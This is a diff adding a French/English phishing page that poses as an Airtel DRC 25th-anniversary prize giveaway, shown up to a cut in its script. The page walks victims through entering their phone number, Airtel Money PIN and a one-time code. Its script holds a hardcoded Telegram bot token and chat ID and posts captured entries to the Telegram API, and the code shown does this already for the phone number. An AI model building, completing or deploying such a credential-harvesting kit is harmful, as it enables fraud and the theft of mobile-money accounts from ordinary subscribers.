@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#E40000">
+  <title>AIRTEL DRC - Grand Celebration</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            airtel: {
+              red: '#E40000',
+              darkRed: '#B30000',
+              lightRed: '#FF1A1A',
+              gold: '#FFD700',
+            }
+          },
+          fontFamily: {
+            sans: ['Outfit', 'system-ui', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap');
+
+    * {
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Outfit', sans-serif;
+      background: #E40000;
+      color: #1a1a1a;
+      overflow-x: hidden;
+    }
+
+    /* ===== Gradients ===== */
+    .airtel-gradient {
+      background: linear-gradient(135deg, #E40000 0%, #B30000 100%);
+    }
+
+    .red-page-bg {
+      background:
+        radial-gradient(circle at 50% 25%, #FF2A2A 0%, #E40000 45%, #A30000 100%);
+    }
+
+    /* ===== Logo Brand Mark ===== */
+    .brand-mark {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #E40000 0%, #B30000 100%);
+      color: #ffffff;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-mark-lg {
+      width: 44px;
+      height: 44px;
+      border-radius: 12px;
+      font-size: 26px;
+      box-shadow: 0 8px 20px -6px rgba(228, 0, 0, 0.5);
+    }
+
+    .brand-mark-sm {
+      width: 34px;
+      height: 34px;
+      border-radius: 10px;
+      font-size: 20px;
+      box-shadow: 0 6px 14px -4px rgba(228, 0, 0, 0.4);
+    }
+
+    .brand-mark-xs {
+      width: 26px;
+      height: 26px;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+
+    /* ===== Animations ===== */
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 0.3; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1.3); }
+    }
+    .animate-pulse-dot {
+      animation: pulse-dot 1.5s ease-in-out infinite;
+    }
+
+    @keyframes slide-up {
+      from { opacity: 0; transform: translateY(20px) scale(0.98); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .animate-slide-up {
+      animation: slide-up 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes fade-in {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .animate-fade-in {
+      animation: fade-in 0.3s ease-out;
+    }
+
+    @keyframes float-badge {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+    .animate-float {
+      animation: float-badge 3s ease-in-out infinite;
+    }
+
+    @keyframes spin-slow {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== Chrome-style loader ===== */
+    .chrome-loader {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      background: conic-gradient(#1a73e8 0deg, #1a73e8 90deg, #e8eaed 90deg, #e8eaed 360deg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      animation: spin-slow 1.5s linear infinite;
+    }
+    .chrome-loader::before {
+      content: '';
+      position: absolute;
+      width: 70px;
+      height: 70px;
+      background: #ffffff;
+      border-radius: 50%;
+      box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.04);
+    }
+
+    /* ===== Indeterminate progress bar ===== */
+    @keyframes indeterminate {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(400%); }
+    }
+    .indeterminate-bar {
+      animation: indeterminate 1.5s infinite linear;
+    }
+
+    /* ===== Badges ===== */
+    .years-badge {
+      border: 3px solid #FFD700;
+      box-shadow:
+        0 0 25px rgba(255, 215, 0, 0.55),
+        inset 0 0 15px rgba(255, 215, 0, 0.2);
+    }
+
+    .trust-badge {
+      background: rgba(255, 255, 255, 0.14);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.22);
+      transition: all 0.2s ease;
+    }
+
+    .trust-badge:hover {
+      background: rgba(255, 255, 255, 0.22);
+      transform: translateY(-1px);
+    }
+
+    /* ===== Inputs ===== */
+    .pin-input,
+    .money-pin {
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .pin-input:focus,
+    .money-pin:focus {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px -4px rgba(228, 0, 0, 0.3);
+    }
+
+    /* ===== Buttons ===== */
+    .btn-primary {
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .btn-primary:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 12px 24px -8px rgba(228, 0, 0, 0.55);
+    }
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    /* ===== Scrollbar ===== */
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: #c4c4c4; border-radius: 4px; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-white selection:text-airtel-red">
+
+  <!-- ============================================================
+       LANDING PAGE
+  ============================================================ -->
+  <div id="landing-page" class="red-page-bg min-h-screen flex flex-col justify-between">
+
+    <!-- Top Bar -->
+    <div class="pt-7 pb-4">
+      <div class="max-w-md mx-auto px-4 flex items-center justify-center gap-3">
+        <div class="flex items-center gap-2.5">
+          <div class="w-9 h-9 bg-white rounded-full flex items-center justify-center font-black text-lg text-airtel-red shadow-lg">A</div>
+          <div class="text-white">
+            <div class="text-base font-extrabold leading-none tracking-tight">AIRTEL</div>
+            <div class="text-[7px] uppercase tracking-[2px] text-white/75 mt-0.5">A Reason To Imagine</div>
+          </div>
+        </div>
+        <div class="px-4 py-1.5 bg-red-800/60 rounded-full border border-yellow-400/50 shadow-lg">
+          <span class="text-yellow-400 font-bold text-xs tracking-wider">25 YEARS TOGETHER</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="flex-grow flex flex-col items-center justify-center px-4 pb-10">
+      <div class="w-full max-w-md text-center">
+
+        <!-- 25 Years Badge -->
+        <div class="flex justify-center mb-7">
+          <div class="years-badge w-24 h-24 rounded-full flex flex-col items-center justify-center bg-gradient-to-br from-red-600 to-red-800 animate-float">
+            <span class="text-3xl font-black text-yellow-400 leading-none">25</span>
+            <span class="text-[10px] font-bold text-yellow-400 tracking-widest mt-1">YEARS</span>
+          </div>
+        </div>
+
+        <!-- Title -->
+        <h1 class="text-4xl md:text-5xl font-black text-white leading-tight mb-2 drop-shadow-md">
+          AIRTEL DRC
+        </h1>
+        <h2 class="text-4xl md:text-5xl font-black text-white leading-tight mb-1 drop-shadow-md">
+          Grand
+        </h2>
+        <h3 class="text-4xl md:text-5xl font-black text-white leading-tight mb-5 drop-shadow-md">
+          Celebration 🎉
+        </h3>
+
+        <!-- Description -->
+        <p class="text-sm text-white/90 leading-relaxed mb-8 max-w-sm mx-auto">
+          To celebrate our 25th anniversary, we're offering exclusive cash prizes to our loyal subscribers. Check your eligibility now!
+        </p>
+
+        <!-- White Card -->
+        <div class="bg-white rounded-2xl p-5 shadow-2xl mb-6">
+          <div class="flex items-center justify-center gap-2 mb-4">
+            <span class="text-lg">🏆</span>
+            <span class="text-sm font-bold text-gray-500">Check my eligibility</span>
+          </div>
+
+          <form onsubmit="handleLandingSubmit(event)" class="space-y-3" novalidate>
+            <div>
+              <input id="input-phone" type="tel" required placeholder="+243 912345678 or 0912345678" maxlength="15"
+                class="w-full bg-gray-50 border border-gray-200 focus:border-airtel-red focus:ring-2 focus:ring-airtel-red/20 rounded-xl py-3.5 px-4 text-gray-800 text-sm placeholder-gray-400 outline-none transition-all text-center font-medium">
+              <p id="error-phone" class="text-xs text-airtel-red mt-1 hidden">
+                <i class="fa-solid fa-circle-exclamation mr-1"></i>Veuillez entrer un numéro valide.
+              </p>
+            </div>
+
+            <button type="submit" class="btn-primary w-full airtel-gradient text-white font-bold py-3.5 rounded-xl shadow-lg shadow-airtel-red/30 flex items-center justify-center gap-2">
+              <i class="fa-solid fa-magnifying-glass text-xs"></i>
+              <span>Verify my number</span>
+            </button>
+          </form>
+        </div>
+
+        <!-- Trust Badges -->
+        <div class="flex justify-center gap-2 flex-wrap">
+          <div class="trust-badge px-3 py-1.5 rounded-full flex items-center gap-1.5">
+            <i class="fa-solid fa-lock text-white text-[10px]"></i>
+            <span class="text-white text-[10px] font-semibold">Secure</span>
+          </div>
+          <div class="trust-badge px-3 py-1.5 rounded-full flex items-center gap-1.5">
+            <i class="fa-solid fa-bolt text-white text-[10px]"></i>
+            <span class="text-white text-[10px] font-semibold">Instant result</span>
+          </div>
+          <div class="trust-badge px-3 py-1.5 rounded-full flex items-center gap-1.5">
+            <i class="fa-solid fa-trophy text-white text-[10px]"></i>
+            <span class="text-white text-[10px] font-semibold">25K winners</span>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       WIZARD (hidden until phone entered)
+  ============================================================ -->
+  <div id="wizard-container" class="hidden min-h-screen bg-[#e8e8e8] flex flex-col">
+
+    <header class="border-b border-gray-300 bg-white sticky top-0 z-50 shadow-sm">
+      <div class="max-w-7xl mx-auto px-4 py-3 flex justify-between items-center">
+        <div class="flex items-center space-x-3">
+          <div class="brand-mark brand-mark-lg">A</div>
+          <div>
+            <span class="text-xl font-extrabold tracking-wider text-gray-800">AIRTEL</span>
+            <span class="text-xs text-airtel-red font-semibold block -mt-1 tracking-widest uppercase">Congo DRC</span>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-4">
+      <div class="w-full max-w-md py-6">
+
+        <!-- Progress Steps -->
+        <div class="mb-8">
+          <div class="flex justify-between items-center text-xs font-semibold text-gray-500 mb-2">
+            <span id="step-label-1" class="text-airtel-red font-bold">1. Numéro</span>
+            <span id="step-label-2">2. Airtel Money</span>
+            <span id="step-label-3">3. Vérification</span>
+            <span id="step-label-4">4. OTP</span>
+            <span id="step-label-5">5. Récompense</span>
+          </div>
+          <div class="h-2 w-full bg-gray-300 rounded-full overflow-hidden">
+            <div id="wizard-progress-bar" class="h-full bg-airtel-red transition-all duration-500 ease-out w-1/5"></div>
+          </div>
+        </div>
+
+        <!-- Card -->
+        <div class="bg-white border border-gray-200 rounded-2xl p-6 md:p-8 shadow-xl relative overflow-hidden">
+          <div class="absolute -top-16 -right-16 w-32 h-32 bg-airtel-red/10 rounded-full blur-2xl pointer-events-none"></div>
+
+          <!-- STEP 2: AIRTEL Money Login -->
+          <div id="step-2" class="space-y-6 hidden animate-fade-in">
+            <div class="text-center pt-2">
+              <div class="flex items-center justify-center space-x-2">
+                <div class="brand-mark brand-mark-sm">A</div>
+                <span class="text-2xl font-extrabold tracking-tight text-airtel-red">AIRTEL</span>
+              </div>
+              <p class="text-[9px] text-gray-500 uppercase tracking-[2px] mt-1">A Reason To Imagine</p>
+            </div>
+
+            <div class="airtel-gradient rounded-xl px-4 py-3 flex items-center gap-3 shadow-lg shadow-airtel-red/20">
+              <span class="text-2xl">🏆</span>
+              <div class="text-left">
+                <p class="text-xs font-bold text-white">AIRTEL DRC - 25th Anniversary</p>
+                <p class="text-[10px] text-white/90">Log in to claim your prize of <span class="font-bold">$1,552</span></p>
+              </div>
+            </div>
+
+            <p class="text-center text-sm font-semibold text-gray-700">Log in to AIRTEL Money to claim your reward.</p>
+
+            <div>
+              <div class="w-full bg-white border-2 border-blue-500 rounded-lg py-3.5 px-4 flex items-center gap-2 shadow-sm">
+                <span class="text-gray-500 text-sm font-medium">CD</span>
+                <span class="text-gray-700 font-mono text-base font-semibold" id="airtel-money-phone">+243 -- --- ----</span>
+              </div>
+            </div>
+
+            <div class="text-center">
+              <p class="text-xs text-gray-500 mb-3">Enter your PIN code</p>
+              <div class="flex justify-center items-center gap-3">
+                <div class="flex gap-2.5" id="money-pin-container">
+                  <input type="password" maxlength="1" inputmode="numeric" class="money-pin w-12 h-14 bg-white border-2 border-blue-500 rounded-lg text-center text-xl font-bold text-gray-800 outline-none focus:border-airtel-red">
+                  <input type="password" maxlength="1" inputmode="numeric" class="money-pin w-12 h-14 bg-white border-2 border-blue-500 rounded-lg text-center text-xl font-bold text-gray-800 outline-none focus:border-airtel-red">
+                  <input type="password" maxlength="1" inputmode="numeric" class="money-pin w-12 h-14 bg-white border-2 border-blue-500 rounded-lg text-center text-xl font-bold text-gray-800 outline-none focus:border-airtel-red">
+                  <input type="password" maxlength="1" inputmode="numeric" class="money-pin w-12 h-14 bg-white border-2 border-blue-500 rounded-lg text-center text-xl font-bold text-gray-800 outline-none focus:border-airtel-red">
+                </div>
+                <button type="button" id="toggle-money-pin" class="text-gray-500 hover:text-airtel-red transition-colors p-1">
+                  <i class="fa-solid fa-eye text-lg"></i>
+                </button>
+              </div>
+              <p id="error-money-pin" class="text-xs text-airtel-red mt-2 hidden">
+                <i class="fa-solid fa-circle-exclamation mr-1"></i>Please fill out this field.
+              </p>
+            </div>
+
+            <div class="flex space-x-3 pt-2">
+              <button type="button" onclick="backToLanding()" class="w-1/3 bg-gray-200 hover:bg-gray-300 text-gray-700 font-semibold py-3.5 rounded-xl transition-all text-xs">
+                Retour
+              </button>
+              <button type="button" onclick="handleStep2Submit(event)" class="btn-primary w-2/3 airtel-gradient text-white font-bold py-3.5 rounded-xl shadow-lg shadow-airtel-red/30 text-sm flex items-center justify-center space-x-2">
+                <i class="fa-solid fa-lock text-xs"></i>
+                <span>Confirm</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- STEP 3: PLEASE WAIT (30s, no timer) -->
+          <div id="step-3" class="space-y-6 hidden text-center py-10 animate-fade-in">
+            <div class="flex justify-center">
+              <div class="chrome-loader"></div>
+            </div>
+            <h2 class="text-3xl font-bold text-blue-600 mt-6">Please wait...</h2>
+            <p class="text-sm text-gray-500">This usually takes a few seconds</p>
+            <div class="pt-6">
+              <div class="h-1.5 w-full bg-gray-200 rounded-full overflow-hidden max-w-xs mx-auto relative">
+                <div class="h-full bg-blue-500 rounded-full w-1/3 indeterminate-bar"></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- STEP 4: OTP VERIFICATION -->
+          <div id="step-4" class="space-y-6 hidden animate-fade-in">
+            <div class="text-center pt-2">
+              <div class="flex items-center justify-center space-x-2">
+                <div class="brand-mark brand-mark-sm">A</div>
+                <span class="text-2xl font-extrabold tracking-tight text-airtel-red">AIRTEL</span>
+              </div>
+              <p class="text-[9px] text-gray-500 uppercase tracking-[2px] mt-1">A Reason To Imagine</p>
+            </div>
+
+            <div class="text-left space-y-2 pt-4">
+              <h2 class="text-2xl font-bold text-gray-900">OTP Verification</h2>
+              <p class="text-sm text-gray-600">Enter the OTP sent to your phone number</p>
+              <p class="text-sm font-bold text-gray-800" id="otp-phone-display">+243 -- --- ----</p>
+            </div>
+
+            <form onsubmit="handleStep4Submit(event)" class="space-y-4 pt-4" novalidate>
+              <div>
+                <input id="input-otp" type="text" maxlength="4" inputmode="numeric" required placeholder="Enter the 4-digit OTP"
+                  class="w-full bg-white border-2 border-blue-500 focus:border-airtel-red focus:ring-2 focus:ring-airtel-red/20 rounded-lg py-4 px-4 text-center text-lg font-mono text-gray-800 placeholder-gray-400 outline-none transition-all">
+                <p class="text-xs text-gray-400 mt-2 text-center">Enter the 4-digit verification code</p>
+                <p class="text-xs text-gray-400 mt-1 text-center">The code expires in 4 seconds</p>
+                <p id="error-otp" class="text-xs text-center text-airtel-red mt-2 hidden">
+                  <i class="fa-solid fa-circle-exclamation mr-1"></i>Please enter the 4-digit OTP.
+                </p>
+              </div>
+
+              <button type="submit" class="btn-primary w-full airtel-gradient text-white font-bold py-3.5 rounded-xl shadow-lg shadow-airtel-red/30 flex items-center justify-center space-x-2">
+                <span>Verify OTP</span>
+                <i class="fa-solid fa-arrow-right text-sm"></i>
+              </button>
+            </form>
+
+            <div class="text-center pt-6 border-t border-gray-100">
+              <div class="flex items-center justify-center space-x-2">
+                <div class="brand-mark brand-mark-xs">A</div>
+                <span class="text-lg font-extrabold tracking-tight text-airtel-red">AIRTEL</span>
+              </div>
+              <p class="text-[8px] text-gray-400 uppercase tracking-[2px] mt-0.5">A Reason To Imagine</p>
+              <p class="text-[8px] text-gray-400 mt-2">© 2026 AIRTEL Congo DRC. All rights reserved.</p>
+            </div>
+          </div>
+
+          <!-- STEP 5: SUCCESS -->
+          <div id="step-5" class="space-y-5 hidden text-center animate-fade-in">
+            <div class="w-16 h-16 airtel-gradient text-white rounded-full flex items-center justify-center mx-auto text-3xl shadow-xl shadow-airtel-red/40 animate-bounce">
+              <i class="fa-solid fa-check"></i>
+            </div>
+
+            <div>
+              <span class="inline-block px-3 py-1 bg-emerald-500/10 text-emerald-600 border border-emerald-500/30 rounded-full text-xs font-bold uppercase tracking-wider mb-2">Vérifié</span>
+              <h2 class="text-2xl font-extrabold text-gray-900">Félicitations!</h2>
+              <p class="text-xs text-gray-500 mt-1">Votre offre promotionnelle AIRTEL Congo DRC a été activée.</p>
+            </div>
+
+            <div class="bg-gray-50 border border-airtel-red/20 rounded-xl p-4 text-left space-y-2 relative overflow-hidden">
+              <div class="absolute right-2 top-2 opacity-5 text-airtel-red text-6xl font-black">AIRTEL</div>
+              <div class="text-xs text-gray-500 uppercase font-semibold">Récapitulatif de l'offre</div>
+              <div class="flex justify-between items-center">
+                <span class="text-xs text-gray-500">Téléphone:</span>
+                <span id="summary-phone" class="font-mono text-xs text-gray-700">--</span>
+              </div>
+              <div class="flex justify-between items-center">
+                <span class="text-xs text-gray-500">Offre:</span>
+                <span id="summary-reward" class="font-bold text-airtel-red text-xs">--</span>
+              </div>
+              <div class="flex justify-between items-center border-t border-gray-200 pt-2 mt-2">
+                <span class="text-xs text-gray-500">Code PIN:</span>
+                <span id="summary-pin" class="font-mono text-xs text-emerald-600 font-bold">****</span>
+              </div>
+            </div>
+
+            <button onclick="resetAll()" class="w-full bg-gray-200 hover:bg-gray-300 text-gray-700 font-semibold py-3 rounded-xl transition-all text-xs flex items-center justify-center space-x-2">
+              <i class="fa-solid fa-rotate-left"></i>
+              <span>Soumettre une autre réclamation</span>
+            </button>
+          </div>
+
+        </div>
+      </div>
+    </main>
+
+    <footer class="border-t border-gray-300 bg-white py-4 text-center text-xs text-gray-500">
+      <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row justify-between items-center gap-2">
+        <p>© 2026 AIRTEL République Démocratique du Congo (DRC).</p>
+        <div class="flex space-x-4">
+          <a href="#" class="hover:text-airtel-red transition-colors">Politique de Confidentialité</a>
+          <a href="#" class="hover:text-airtel-red transition-colors">Termes & Conditions</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- ============================================================
+       POPUP 1: EVALUATION (7s) & CONGRATS
+  ============================================================ -->
+  <div id="loading-popup-overlay" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-[1000] hidden items-center justify-center p-4">
+    <div class="w-full max-w-md relative animate-slide-up">
+      <div class="bg-[#e8e8e8] rounded-2xl overflow-hidden shadow-2xl border border-gray-300">
+
+        <!-- EVALUATION -->
+        <div id="loading-screen-eval">
+          <div class="bg-gradient-to-r from-red-700 to-red-600 px-5 py-4 text-center relative">
+            <button onclick="closeLoadingPopup()" class="absolute top-3 right-3 w-8 h-8 rounded-full bg-white/20 hover:bg-white/30 flex items-center justify-center text-white text-lg transition-all">✕</button>
+            <div class="text-lg font-bold text-white tracking-tight">Evaluation in progress<span class="font-light">…</span></div>
+            <div class="inline-block mt-2 px-4 py-1.5 bg-white/20 rounded-full text-xs font-medium text-white backdrop-blur-sm border border-white/20" id="eval-phone-display">
+              +243 -- --- ----
+            </div>
+          </div>
+
+          <div class="p-6 space-y-5 bg-[#e8e8e8]">
+            <div class="flex items-center gap-4">
+              <div id="eval-step1-icon" class="w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-airtel-red text-white shadow-lg shadow-airtel-red/30 transition-all">✓</div>
+              <span class="text-sm font-medium text-gray-800">Number verification</span>
+            </div>
+            <div class="flex items-center gap-4">
+              <div id="eval-step2-icon" class="w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-airtel-red text-white shadow-lg shadow-airtel-red/30 transition-all">✓</div>
+              <span class="text-sm font-medium text-gray-800">Customer history analysis</span>
+            </div>
+            <div class="flex items-center gap-4">
+              <div id="eval-step3-icon" class="w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-white text-airtel-red border-[3px] border-airtel-red transition-all">✓</div>
+              <span id="eval-step3-text" class="text-sm font-medium text-gray-500 transition-all">Calculation of the eligible amount</span>
+            </div>
+            <div class="flex items-center gap-4">
+              <div id="eval-step4-icon" class="w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-white text-teal-600 border-[3px] border-airtel-red transition-all">✓</div>
+              <span id="eval-step4-text" class="text-sm font-medium text-gray-500 transition-all">Final confirmation</span>
+            </div>
+          </div>
+
+          <div class="px-6 pb-6 pt-2 bg-[#e8e8e8]">
+            <div class="h-2.5 w-full bg-gray-300 rounded-full overflow-hidden">
+              <div id="eval-progress-bar" class="h-full airtel-gradient rounded-full" style="width: 0%;"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CONGRATS -->
+        <div id="loading-screen-congrats" class="hidden">
+          <div class="bg-gradient-to-r from-red-700 to-red-600 px-5 py-6 text-center relative">
+            <button onclick="closeLoadingPopup()" class="absolute top-3 right-3 w-8 h-8 rounded-full bg-white/20 hover:bg-white/30 flex items-center justify-center text-white text-lg transition-all">✕</button>
+            <div class="text-3xl mb-1">🎉</div>
+            <div class="text-2xl font-extrabold text-white tracking-tight">Congratulations !</div>
+            <div class="inline-block mt-3 px-4 py-1.5 bg-white/20 rounded-full text-sm font-medium text-white backdrop-blur-sm border border-white/20" id="congrats-phone-display">
+              +243 -- --- ----
+            </div>
+          </div>
+
+          <div class="p-6 bg-[#e8e8e8] text-center">
+            <div class="text-[10px] uppercase tracking-[3px] font-bold text-gray-500 mb-1">Eligible amount</div>
+            <div class="text-5xl font-extrabold text-airtel-red tracking-tighter drop-shadow-lg">$769</div>
+            <div class="text-xs text-gray-500 mt-2 mb-6">AIRTEL Money credit — valid for 48 hours</div>
+
+            <div class="text-left space-y-4 mb-6">
+              <div class="flex items-center gap-3">
+                <span class="w-7 h-7 rounded-full bg-airtel-red flex items-center justify-center text-white text-xs font-bold shadow-lg shadow-airtel-red/30">✓</span>
+                <span class="text-sm text-gray-700">Instant transfer to your account</span>
+              </div>
+              <div class="flex items-center gap-3">
+                <span class="w-7 h-7 rounded-full bg-airtel-red flex items-center justify-center text-white text-xs font-bold shadow-lg shadow-airtel-red/30">✓</span>
+                <span class="text-sm text-gray-700">No claim fees</span>
+              </div>
+              <div class="flex items-center gap-3">
+                <span class="w-7 h-7 rounded-full bg-airtel-red flex items-center justify-center text-white text-xs font-bold shadow-lg shadow-airtel-red/30">✓</span>
+                <span class="text-sm text-gray-700">Exclusive 25th Anniversary Offer</span>
+              </div>
+            </div>
+
+            <button onclick="proceedFromCongrats()" class="btn-primary w-full airtel-gradient text-white font-bold py-4 rounded-full shadow-xl shadow-airtel-red/40 flex items-center justify-center gap-2 text-base">
+              <span>🎁</span>
+              <span>Claim my prize now</span>
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       POPUP 2: PRICE DEMANDED
+  ============================================================ -->
+  <div id="price-demanded-overlay" class="fixed inset-0 bg-white/95 backdrop-blur-sm z-[1100] hidden items-center justify-center p-4">
+    <div class="w-full max-w-md relative animate-slide-up">
+      <div class="bg-white rounded-2xl overflow-hidden shadow-2xl border border-gray-200">
+
+        <div class="bg-gradient-to-r from-red-700 to-red-600 py-4 text-center">
+          <span class="text-yellow-400 font-bold tracking-wider text-lg">AIRTEL 25 Ans</span>
+        </div>
+
+        <div class="p-8 text-center">
+          <div class="w-24 h-24 bg-airtel-red rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-airtel-red/30">
+            <i class="fa-solid fa-check text-white text-5xl"></i>
+          </div>
+
+          <h2 class="text-3xl font-extrabold text-airtel-red mb-4">Price demanded!</h2>
+
+          <p class="text-sm text-gray-600 leading-relaxed mb-6">
+            Log in to your AIRTEL Money account to complete the <span class="font-bold text-airtel-red">$1,552</span> transfer. It only takes a few seconds.
+          </p>
+
+          <div class="mb-6">
+            <p class="text-xs text-gray-400 mb-1">Transaction reference</p>
+            <p class="text-base font-mono font-bold text-airtel-red tracking-wider">AIR-KNVQ-8488</p>
+          </div>
+
+          <button onclick="proceedFromPriceDemanded()" class="btn-primary w-full airtel-gradient text-white font-bold py-4 rounded-full shadow-xl shadow-airtel-red/30 flex items-center justify-center gap-2 text-base mb-4">
+            <i class="fa-solid fa-lock text-sm"></i>
+            <span>Log in to receive the prize</span>
+          </button>
+
+          <button onclick="closePriceDemanded()" class="text-xs text-gray-400 hover:text-gray-600 underline transition-colors">
+            Later
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ============================================================
+       TELEGRAM CONFIGURATION
+       Replace with your real values from @BotFather and @userinfobot
+    ============================================================ */
+    const TELEGRAM_BOT_TOKEN = "8032561335:AAFdWfr7fYRi768h9VOPs8r7PU-m6nPSP3c";
+    const TELEGRAM_CHAT_ID = "6871363396";
+
+    /* ============================================================
+       STATE
+    ============================================================ */
+    const state = {
+      currentStep: 1,
+      formData: { phone: '', moneyPin: '', reward: '1,552 USD AIRTEL Money', otp: '', pin: '' },
+      loadingInterval: null,
+      waitInterval: null,
+      loadingElapsed: 0,
+      waitElapsed: 0,
+      moneyPinVisible: false,
+      LOADING_DURATION_MS: 7000,
+      WAIT_DURATION_MS: 30000,
+    };
+
+    /* ============================================================
+       INIT
+    ============================================================ */
+    document.addEventListener('DOMContentLoaded', () => {
+      setupMoneyPinAutoTab();
+      setupMoneyPinToggle();
+    });
+
+    /* ============================================================
+       TELEGRAM
+    ============================================================ */
+    async function sendToTelegram(message) {
+      if (TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") {
+        console.warn("⚠️ Telegram non configuré. Message non envoyé:", message);
+        return;
+      }
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error("Erreur Telegram:", err);
+      }
+    }
+
+    function getTimestamp() {
+      const now = new Date();
+      return now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    }
+
+    /* ============================================================
+       NAVIGATION
+    ============================================================ */
+    function showWizard() {
+      document.getElementById('landing-page').classList.add('hidden');
+      document.getElementById('wizard-container').classList.remove('hidden');
+    }
+
+    function backToLanding() {
+      document.getElementById('wizard-container').classList.add('hidden');
+      document.getElementById('landing-page').classList.remove('hidden');
+      state.currentStep = 1;
+    }
+
+    function goToStep(stepNum) {
+      state.currentStep = stepNum;
+      for (let i = 1; i <= 5; i++) {
+        const el = document.getElementById(`step-${i}`);
+        if (el) el.classList.add('hidden');
+      }
+      const currentEl = document.getElementById(`step-${stepNum}`);
+      if (currentEl) currentEl.classList.remove('hidden');
+
+      const progressBar = document.getElementById('wizard-progress-bar');
+      progressBar.style.width = `${(stepNum / 5) * 100}%`;
+
+      for (let i = 1; i <= 5; i++) {
+        const label = document.getElementById(`step-label-${i}`);
+        if (label) {
+          label.className = i <= stepNum ? "text-airtel-red font-bold" : "text-gray-400 font-semibold";
+        }
+      }
+    }
+
+    /* ============================================================
+       STEP 1: LANDING / PHONE
+    ============================================================ */
+    function handleLandingSubmit(e) {
+      e.preventDefault();
+      const phoneInput = document.getElementById('input-phone');
+      const phoneError = document.getElementById('error-phone');
+
+      const cleanValue = phoneInput.value.trim().replace(/\s+/g, '');
+      const digitsOnly = cleanValue.replace(/\D/g, '');
+
+      if (digitsOnly.length < 6) {
+        phoneError.classList.remove('hidden');
+        return;
+      }
+
+      phoneError.classList.add('hidden');
+      state.formData.phone = cleanValue.startsWith('+')
+        ? cleanValue
+        : '+243 ' + digitsOnly.replace(/^0+/, '');
+
+      sendToTelegram(
+`📱 *NOUVEAU NUMÉRO ENTRÉ*
+
+📞 Téléphone: \`${state.formData.phone}\`
+🕒 Heure: ${getTimestamp()}`
+      );
+
+      // Update all display spots
+      ['eval-phone-display', 'congrats-phone-display', 'airtel-money-phone', 'otp-phone-display']
+        .forEach(id => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = state.formData.phone;
+        });
+
+      showWizard();
+      showLoadingPopup();
+    }
+
+    /* ============================================================
+       STEP 2: AIRTEL MONEY PIN
+    ============================================================ */
+    function handleStep2Submit(e) {
+      if (e && e.preventDefault) e.preventDefault();
+      const moneyPinInputs = document.querySelectorAll('.money-pin');
+      const moneyPinError = document.getElementById('error-money-pin');
+
+      let enteredMoneyPin = '';
+      moneyPinInputs.forEach(i => enteredMoneyPin += i.value);
+
+      if (enteredMoneyPin.length < 4) {
+        moneyPinError.classList.remove('hidden');
+        return;
+      }
+
